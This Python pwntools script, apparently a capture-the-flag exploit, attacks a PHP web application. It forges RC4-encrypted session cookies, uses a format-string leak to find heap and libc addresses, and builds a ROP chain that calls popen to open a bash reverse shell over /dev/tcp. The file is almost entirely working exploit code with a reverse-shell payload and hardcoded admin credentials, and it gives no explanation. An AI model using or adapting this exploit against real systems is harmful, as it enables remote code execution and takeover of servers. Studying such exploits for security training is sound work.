#!/usr/bin/python3 
#coding:utf-8 

from pwn import *
import requests
from urllib.parse import unquote,quote
import base64
import os
from binascii import unhexlify
import IPython

key = '20190712'
def crypto(string):
    sbox = []
    for i in range(256):
        sbox.append(i)
    j = 0
    for i in range(256):
        j = (sbox[i] + j + ord(key[i%8]))%0x100
        sbox[i],sbox[j] = sbox[j],sbox[i]
    i1 = 0
    i2 = 0
    s = ''
    for i in range(len(string)):
        i1 = (i1 + 1)%0x100
        i2 = (i2 + sbox[i1])%0x100
        sbox[i1],sbox[i2] = sbox[i2],sbox[i1]
        s += chr(string[i] ^ sbox[(sbox[i1]+sbox[i2])%0x100])
    return s

command = b"/bin/bash -c '/bin/bash -i >&/dev/tcp/127.0.0.1/7777 0>&1'\x00"

# command = b"/bin/bash -i >&/dev/tcp/127.0.0.1/7777 0>&1\x00"

burp0_url = "http://127.0.0.1:8887/index.php?a=bbbbbbbbbbb%00cccccccc"
burp0_cookies = {"PHPSESSID": "769cb13v1vbmusfntcpqs3t3bl"}
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://172.16.91.148/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data={"username": "admin", "password": ":admiN123:"}
#a = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
#print base64.b64decode(crypto(base64.b64decode(unquote(a.text.split("cookie='S=")[1].split("';location.hre")[0]))))

def f(fmt,exp):
    # try:
    b = os.popen("php a.php "+base64.b64encode(  bytes(fmt,encoding='latin-1') ).decode("latin-1")+" "+base64.b64encode(exp).decode("latin-1")).read()
    burp0_cookies["S"] = quote( base64.b64encode( crypto(b.encode("latin-1")).encode("latin-1")) ) 
    return requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    # except Exception as e:
        # print(e.with_traceback(None))
        # return 0

format_str = 'AAAAAAAA'+"%p"*700
exp = b"D"*24+b"EEEEEEEE"*37
a = f(format_str,exp).text.replace("<!-- ./html.zip --!>",'')
#print a
# print(a.split('|'))

heap_addr = a.split('0x')[2] # rdx 
log.success("heap_addr: 0x"+heap_addr)
heap_addr = int('0x'+heap_addr,16)

# IPython.embed()
# exit()

libc_addr = a.split('0x')
libc_addr = libc_addr[-1] # libc addr end with 'aa', you need to adjust the index according to the actual situation.
libc_addr = int("0x"+libc_addr,16) - 0x5b9aa
log.success('libc_addr: ' + hex(libc_addr))
magic_addr = libc_addr + 0x114334   # push [rcx]; rcr [rbx+0x51],0x41 ; pop rsp ;ret ;  (0x00007f40aa5aa000 + 0x114334)
log.success('magic_addr: ' + hex(magic_addr)) 

# lib php addr 0x00007ffff3f67000 
# pop_ret = lib_php_addr + 0xdb427 #  
# pop_rsi = lib_php_addr + 0xdb427
# pop_rdi = lib_php_addr + 0xdbb5c

pop_rdi =  libc_addr + 0x000000000002155f #  pop rdi ; ret 
pop_rsi = libc_addr + 0x0000000000023e6a  # pop rsi ; ret 
pop_ret = libc_addr + 0x000000000002155f  # pop rdi; ret
call_popen = libc_addr + 0x80930 # call popen

# libc base = 0x00007fd5f3ffe000 
# popen 0x00007ffff70f3000 + 0x80930 = 0x7ffff7173930

format_str = "AAAAAAAA%p%Z%p%p"+"%p"*(700-4)
exp = p64(heap_addr+0x10) # heap_addr  (rbx)      zval : size(0x10)   0x7f9746cd2998 
exp += p64(0x8)           # heap_addr+0x8         
exp += p64(heap_addr+0x20)# heap_addr+0x10 (rcx)  zend_object: size(0x38) 0x7f9746cd29a8
exp += bytes("AAAAAAAA",encoding="latin-1")       # heap_addr+0x18   
exp += p64(pop_ret)        # heap_addr+0x20       # 
exp += p64(heap_addr+0x30) # heap_addr + 0x28    handlers 
exp += p64(pop_rdi)        # heap_addr + 0x30    zend_object_handlers: size(0xe0) 
exp += p64(heap_addr+0xe8) # heap_addr + 0x38    "command"
exp += p64(pop_rsi)        #  
exp += p64(heap_addr+0xe0) # 
exp += p64(call_popen)     # read_property 
exp += bytes("CCCCCCCC"*16,encoding="latin-1")
exp += p64(magic_addr)   # 进行栈迁移
exp += bytes("r",encoding="latin-1")+b"\x00"*7
exp += command.ljust(80,b'\x00')
exp += bytes("AAAAAAAA",encoding="latin-1") 
a = f(format_str,exp)
log.success("exploit ok")
